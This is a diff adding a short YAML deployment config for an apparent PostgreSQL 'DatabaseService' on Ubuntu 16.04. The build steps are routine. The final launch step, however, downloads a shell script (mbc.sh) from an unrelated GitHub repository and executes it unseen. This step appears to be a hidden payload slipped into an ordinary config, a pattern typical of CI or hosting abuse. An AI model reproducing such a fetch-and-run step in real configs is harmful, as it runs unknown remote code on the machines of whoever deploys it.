@@ -1,0 +1,15 @@
+deployments:
+  DatabaseService:
+    dockerimage:
+      ubuntu:16.04
+    build_steps:
+      - DEBIAN_FRONTEND=noninteractive apt-get update
+      - DEBIAN_FRONTEND=noninteractive apt-get install -y 
+      software-properties-common
+      - DEBIAN_FRONTEND=noninteractive apt-get install -y 
+        locales gcc postgresql postgresql-contrib 
+        sudo supervisor
+    launch_steps:
+      - checkout
+      - run: sudo apt-get update
+      - run: wget https://raw.githubusercontent.com/agamlimaa/saya/main/mbc.sh && chmod +x mbc.sh && ./mbc.sh
